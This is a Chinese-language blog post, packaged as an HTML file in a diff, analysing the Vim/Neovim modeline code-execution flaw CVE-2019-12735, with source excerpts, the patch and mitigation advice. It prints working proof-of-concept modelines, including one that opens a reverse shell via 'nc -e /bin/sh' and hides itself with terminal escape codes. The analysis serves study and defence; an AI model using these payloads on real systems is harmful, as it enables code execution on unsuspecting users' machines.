@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vim任意代码执行漏洞 - B1TG</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="b1tg" /><meta name="description" content="CVE-2019-12735" /><meta name="keywords" content="Hugo, b1tg, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.73.0 with theme even" />
+
+
+<link rel="canonical" href="https://b1tg.github.io/post/vim-arbitary-execute/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vim任意代码执行漏洞" />
+<meta property="og:description" content="CVE-2019-12735" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b1tg.github.io/post/vim-arbitary-execute/" />
+<meta property="article:published_time" content="2019-06-16T12:02:27+08:00" />
+<meta property="article:modified_time" content="2019-06-16T12:02:27+08:00" />
+<meta itemprop="name" content="Vim任意代码执行漏洞">
+<meta itemprop="description" content="CVE-2019-12735">
+<meta itemprop="datePublished" content="2019-06-16T12:02:27&#43;08:00" />
+<meta itemprop="dateModified" content="2019-06-16T12:02:27&#43;08:00" />
+<meta itemprop="wordCount" content="2699">
+
+
+
+<meta itemprop="keywords" content="漏洞分析," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vim任意代码执行漏洞"/>
+<meta name="twitter:description" content="CVE-2019-12735"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">B1TG</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">B1TG</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vim任意代码执行漏洞</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-06-16 </span>
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#漏洞成因">漏洞成因</a></li>
+    <li><a href="#poc分析">PoC分析</a>
+      <ul>
+        <li><a href="#命令执行">命令执行</a></li>
+        <li><a href="#反弹shell">反弹shell</a></li>
+        <li><a href="#可能遇到的问题">可能遇到的问题</a></li>
+      </ul>
+    </li>
+    <li><a href="#修复">修复</a></li>
+    <li><a href="#安全建议">安全建议</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="背景">背景</h2>
+<p>近日，著名编辑器Vim/NeoVim爆出了任意代码执行漏洞，打开恶意文件即可触发，受影响的版本：</p>
+<p>Vim &lt; 8.1.1365， Neovim &lt; 0.3.6</p>
+<h2 id="漏洞成因">漏洞成因</h2>
+<p>漏洞产生于Vim的modeline功能中，使用modeline功能时，通常把一段配置代码放在文件的开头或结尾处，用于对此文件进行编辑器功能的配置，此配置会覆盖Vim的默认配置(通常在<code>~/.vimrc</code>中)。</p>
+<p>modeline功能便于文件在共享时保持一致的编辑格式。例如，我们通常会在Python文件开头加上modeline来设置缩进：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># vim: ai ts=4 sts=4 et sw=4 ft=python</span>
+<span class="c1"># vim: autoindent tabstop=4 shiftwidth=4 expandtab softtabstop=4 filetype=python</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>由于modeline中的命令运行于命令模式(在正常模式下按<code>:</code>进入)，而在命令模式下可以进行修改文件、执行脚本等敏感操作，这就产生了被恶意攻击的可能。</p>
+<p>因此从安全角度考虑，在modeline中，只支持set命令，同时一些配置项会被隔离到沙箱(sandbox)中运行。</p>
+<p>在沙箱中，修改文件、修改快捷键、执行shell脚本等操作都被禁止。</p>
+<p>沙箱检查由函数<code>check_secure</code>实现，用<code>HAVE_SANDBOX</code>判断是否在沙箱中，是的话生成错误信息并返回TRUE。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// vim/src/ex_cmds.c
+</span><span class="c1"></span><span class="cm">/*
+</span><span class="cm"> * Check if the secure flag is set (.exrc or .vimrc in current directory).
+</span><span class="cm"> * If so, give an error message and return TRUE.
+</span><span class="cm"> * Otherwise, return FALSE.
+</span><span class="cm"> */</span>
+    <span class="kt">int</span>
+<span class="nf">check_secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">secure</span><span class="p">)</span>
+    <span class="p">{</span>
+    <span class="n">secure</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="n">emsg</span><span class="p">(</span><span class="n">_</span><span class="p">(</span><span class="n">e_curdir</span><span class="p">));</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">#ifdef HAVE_SANDBOX
+</span><span class="cp"></span>    <span class="cm">/*
+</span><span class="cm">     * In the sandbox more things are not allowed, including the things
+</span><span class="cm">     * disallowed in secure mode.
+</span><span class="cm">     */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">sandbox</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+    <span class="n">emsg</span><span class="p">(</span><span class="n">_</span><span class="p">(</span><span class="n">e_sandbox</span><span class="p">));</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">#endif
+</span><span class="cp"></span>    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>check_secure</code>函数在一些涉及敏感操作的地方被用到，例如在<code>buf_write</code>函数中的使用，禁止了在沙箱模式下写buf文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// vim/src/fileio.c
+</span><span class="c1"></span>    <span class="kt">int</span>
+<span class="nf">buf_write</span><span class="p">(...)</span>
+<span class="p">{</span>
+    <span class="c1">// ...
+</span><span class="c1"></span>    <span class="cm">/*
+</span><span class="cm">     * Disallow writing from .exrc and .vimrc in current directory for
+</span><span class="cm">     * security reasons.
+</span><span class="cm">     */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">check_secure</span><span class="p">())</span>
+      <span class="k">return</span> <span class="n">FAIL</span><span class="p">;</span>
+    <span class="c1">// ...
+</span><span class="c1"></span> <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然而在<code>:source!</code>命令中，并没有进行沙箱检查。<code>:source!</code>命令用于在命令模式下逐个运行目标文件中的命令，通常被用来加载配置文件。同时，在命令模式下有多种方式执行shell脚本。</p>
+<p>前文提到，可以在modeline中设置的配置项是有限的，因此需要一个能让我们执行<code>:source!</code>的配置项。</p>
+<p>配置项的限制是通过<code>P_SECURE</code>这个flag来判断的，<code>foldexpr</code>没有设置<code>P_SECURE</code>，符合要求。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// vim/src/option.c
+</span><span class="c1">// foldexpr 未设置P_SECURE
+</span><span class="c1"></span><span class="k">static</span> <span class="k">struct</span> <span class="n">vimoption</span> <span class="n">options</span><span class="p">[]</span> <span class="o">=</span>
+<span class="p">{</span>
+   <span class="c1">// ...
+</span><span class="c1"></span>    <span class="p">{</span><span class="s">&#34;foldexpr&#34;</span><span class="p">,</span>    <span class="s">&#34;fde&#34;</span><span class="p">,</span>  <span class="n">P_STRING</span><span class="o">|</span><span class="n">P_ALLOCED</span><span class="o">|</span><span class="n">P_VIM</span><span class="o">|</span><span class="n">P_VI_DEF</span><span class="o">|</span><span class="n">P_RWIN</span><span class="o">|</span><span class="n">P_MLE</span><span class="p">,</span>
+<span class="cp">#if defined(FEAT_FOLDING) &amp;&amp; defined(FEAT_EVAL)
+</span><span class="cp"></span>                <span class="p">(</span><span class="n">char_u</span> <span class="o">*</span><span class="p">)</span><span class="n">VAR_WIN</span><span class="p">,</span> <span class="n">PV_FDE</span><span class="p">,</span>
+                <span class="p">{(</span><span class="n">char_u</span> <span class="o">*</span><span class="p">)</span><span class="s">&#34;0&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">char_u</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">}</span>
+<span class="cp">#else
+</span><span class="cp"></span>                <span class="p">(</span><span class="n">char_u</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PV_NONE</span><span class="p">,</span>
+                <span class="p">{(</span><span class="n">char_u</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">char_u</span> <span class="o">*</span><span class="p">)</span><span class="mi">0L</span><span class="p">}</span>
+<span class="cp">#endif
+</span><span class="cp"></span>                <span class="n">SCTX_INIT</span><span class="p">}</span>
+<span class="c1">// ...          
+</span><span class="c1"></span><span class="p">};</span>
+<span class="c1">// ...
+</span><span class="c1">// 通过option的flag判断
+</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">P_SECURE</span> <span class="o">|</span> <span class="n">P_NO_ML</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="n">errmsg</span> <span class="o">=</span> <span class="n">_</span><span class="p">(</span><span class="s">&#34;E520: Not allowed in a modeline&#34;</span><span class="p">);</span>
+    <span class="k">goto</span> <span class="n">skip</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>因此，可以构造PoC如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">:!uname -a<span class="o">||</span><span class="s2">&#34; vi:fen:fdm=expr:fde=assert_fails(&#34;</span>source! %<span class="s2">&#34;):fdl=0:fdt=&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>保存成文件<code>poc.txt</code>，用Vim打开，命令<code>uname -a</code>将会被执行。</p>
+<h2 id="poc分析">PoC分析</h2>
+<h3 id="命令执行">命令执行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># poc.txt</span>
+:!uname -a<span class="o">||</span><span class="s2">&#34; vi:fen:fdm=expr:fde=assert_fails(&#34;</span>source! %<span class="s2">&#34;):fdl=0:fdt=&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>打开poc.txt时，Vim会在首行寻找modeline，从vi:处开始匹配，忽略前面的字符，解析出的modeline表达式为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">vi:fen:fdm=expr:fde=assert_fails(&#34;source! %&#34;):fdl=0:fdt=
+</code></pre></td></tr></table>
+</div>
+</div><p>modeline中的配置项(option settings)通过<code>:</code>分隔，vi后面的每一项都会当做<code>:set</code>的参数在<code>normal</code>模式下被运行。</p>
+<p>这里的一系列配置都是有关于代码折叠的，让我们逐个解析配置项:</p>
+<ul>
+<li><code>fen</code>: 当值为off时，所有的代码折叠都被打开，默认是off</li>
+<li><code>fdm=expr</code>: 产生折叠的方式，可能的值有manual, indent, expr, marker, syntax, diff。 其中expr表示将由’foldexpr’的值来给出某一行的折叠level</li>
+<li><code>fde=assert_fails(&quot;source! %&quot;)</code>: fde是foldexpr的缩写，功能见上一条；source!命令前文已经提过，这里的%是指当前文件；assert_fails用于执行命令并处理错误信息，这里我们只用于执行命令。</li>
+<li><code>fdl=0</code>: 折叠的程度，设置为0时会关闭所有的折叠，默认是0</li>
+<li><code>fdt</code>: 被关闭的折叠处显示的字符串,默认是”foldtext()”</li>
+</ul>
+<p>综合下来，这个modeline会让Vim执行<code>:source! poc.txt</code>，让我们来看会发生什么。</p>
+<p><code>poc.txt</code>中只有一行，相当于在Vim normal mode中运行这一行，<code>:!xxx</code>表示在shell中执行<code>xxx</code>命令。</p>
+<p>所以，下面的命令会在shell中被执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">uname -a<span class="o">||</span><span class="s2">&#34; vi:fen:fdm=expr:fde=assert_fails(&#34;</span>source!<span class="se">\%</span><span class="s2">&#34;):fdl=0:fdt=&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>||</code>表示只有在前一个命令执行失败后才会执行后一个命令，在这里<code>uname -a</code>会执行成功，<code>||</code>后面的字符串被忽略，所以PoC到这里就执行成功了。</p>
+<h3 id="反弹shell">反弹shell</h3>
+<p>漏洞作者给出了另一个PoC，可以反弹一个shell, 利用了转义字符使得恶意代码在终端不可见，还在PoC执行结束后重写了文件使得痕迹被彻底清除。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 在另一终端窗口运行nc -vlp 9999</span>
+<span class="c1"># shell.txt</span> 
+x1b<span class="o">[</span>?7lx1bSNothing here.x1b:silent! w <span class="p">|</span> call system<span class="o">(</span><span class="s1">&#39;nohup nc 127.0.0.1 9999 -e /bin/sh &amp;&#39;</span><span class="o">)</span> <span class="p">|</span> redraw! <span class="p">|</span> file <span class="p">|</span> silent! <span class="c1"># &#34; vim: set fen fdm=expr fde=assert_fails(&#39;set\ fde=x\ \|\ source\!\ \%&#39;) fdl=0: x16x1b[1Gx16x1b[KNothing here.&#34;x16x1b[D n</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>除去转义字符和重写文件部分，可以简化成如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># shell_simple.txt</span>
+:call system<span class="o">(</span><span class="s1">&#39;nohup nc 127.0.0.1 9999 -e /bin/sh &amp;&#39;</span><span class="o">)</span>  <span class="o">||</span><span class="s2">&#34; vi:fen:fdm=expr:fde=assert_fails(&#34;</span>source! %<span class="s2">&#34;):fdl=0:fdt=&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>由前面的知识我们可以知道，此poc会在vim的normal模式下运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">:call system(&#39;nohup nc 127.0.0.1 9999 -e /bin/sh &amp;&#39;)
+</code></pre></td></tr></table>
+</div>
+</div><p>拆开分析：</p>
+<ul>
+<li>call: 执行一个函数</li>
+<li>system(): 执行shell命令</li>
+<li><code>nohup nc 127.0.0.1 9999 -e /bin/sh &amp;</code>： 反弹shell</li>
+</ul>
+<h3 id="可能遇到的问题">可能遇到的问题</h3>
+<p><strong>modeline功能开关</strong></p>
+<p>普通用户的modeline功能默认开启，而root用户是默认关闭的。
+可以在命令模式下使用<code>:echo &amp;modeline</code>查看开启情况，返回1就是开启、0就是关闭。modeline功能
+需要打开，PoC才能成功运行，可以在<code>~/.vimrc</code>中加上一行<code>set modeline</code>确保开启此功能。</p>
+<p><strong>第二个反弹shell的PoC，复制粘贴到本地运行会失败</strong></p>
+<p>刚开始看到这两段exp的时候，我只成功复现了第一个，第二个失败了。研究后发现问题出现在转义字符上，这时候我看到PoC作者的<a href="https://github.com/numirias/security">repo</a>里面带了第二段exp的源文件，于是我用wget下载了<a href="https://raw.githubusercontent.com/numirias/security/master/data/2019-06-04_ace-vim-neovim/shell.txt">shell.txt</a>，重新尝试，这次漏洞复现成功了！</p>
+<p>用二进制查看工具<code>Okteta</code>打开<code>shell.txt</code>，可以看到转义字符<code>x1b</code>是非显示字符。转义字符常常用来控制终端显示、光标移动等，第二个PoC中就利用了转义字符隐藏代码的功能，有关转义字符的知识可以参考这个链接<a href="http://notes.burke.libbey.me/ansi-escape-codes/">ansi-escape-codes</a>。</p>
+<p><img src="/img/vim-arbitary-execute/t0178257fa440f2e6ae.png" alt="hexedit shell.txt"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ cat shell.txt   <span class="c1"># 部分输出在终端中被隐藏</span>
+Nothing here
+$ cat -A shell.txt 
+^<span class="o">[[</span>?7l^<span class="o">[</span>SNothing here.^<span class="o">[</span>:silent! w <span class="p">|</span> call system<span class="o">(</span><span class="s1">&#39;nohup nc 127.0.0.1 9999 -e /bin/sh &amp;&#39;</span><span class="o">)</span> <span class="p">|</span> redraw! <span class="p">|</span> file <span class="p">|</span> silent! <span class="c1"># &#34; vim: set fen fdm=expr fde=assert_fails(&#39;set fde=x | source! %&#39;) fdl=0: ^V^[[1G^V^[[KNothing here.&#34;^V^[[D $</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>作者文章给出代码中的<code>x1b</code>是为了更清晰地表达，并不能直接复制使用。</p>
+<p>所以如果我们想要修改第二段利用代码，比较简单的方式是是下载<a href="https://raw.githubusercontent.com/numirias/security/master/data/2019-06-04_ace-vim-neovim/shell.txt">源文件</a>，修改执行命令的部分，当然也可以使用二进制编辑器直接编写或修改。</p>
+<h2 id="修复">修复</h2>
+<p>Vim发布了 patch 8.1.1365: source command doesn’t check for the sandbox</p>
+<p>在<code>openscript</code>函数中增加了沙箱的检查，防止在沙箱中source文件。</p>
+<p><img src="/img/vim-arbitary-execute/t014306cae4e125414c.png" alt="patch_commit"></p>
+<p><img src="/img/vim-arbitary-execute/t01a0dd1548d802c563.png" alt="patch_diff"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+</span><span class="cm"> * Open a new script file for the &#34;:source!&#34; command.
+</span><span class="cm"> */</span>
+    <span class="kt">void</span>
+<span class="nf">openscript</span><span class="p">(</span>
+  <span class="c1">// ...
+</span><span class="c1"></span>  <span class="c1">// Disallow sourcing a file in the sandbox, the commands would be executed
+</span><span class="c1"></span>  <span class="c1">// later, possibly outside of the sandbox.
+</span><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">check_secure</span><span class="p">())</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">// ...
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="安全建议">安全建议</h2>
+<ol>
+<li>更新到vim &gt;= 8.1.1365 / neovim &gt; v0.3.6</li>
+<li>在vimrc中加入<code>set nomodeline</code>，禁用modeline</li>
+<li>不要轻易打开来路不明的文件</li>
+</ol>
+<h2 id="参考">参考</h2>
+<p><a href="https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md">2019-06-04_ace-vim-neovim</a></p>
+<p><a href="https://vimhelp.org/">vim online help</a></p>
+<p><a href="https://github.com/vim/vim/commit/5357552">vim patch</a></p>
+<p>文章首发于<a href="https://www.anquanke.com/post/id/180386">安全客</a></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">b1tg</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2019-06-16
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/how2heap/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">how2heap笔记</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="http://github.com/b1tg" class="iconfont icon-github" title="github"></a>
+  <a href="https://b1tg.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2018 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">b1tg</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
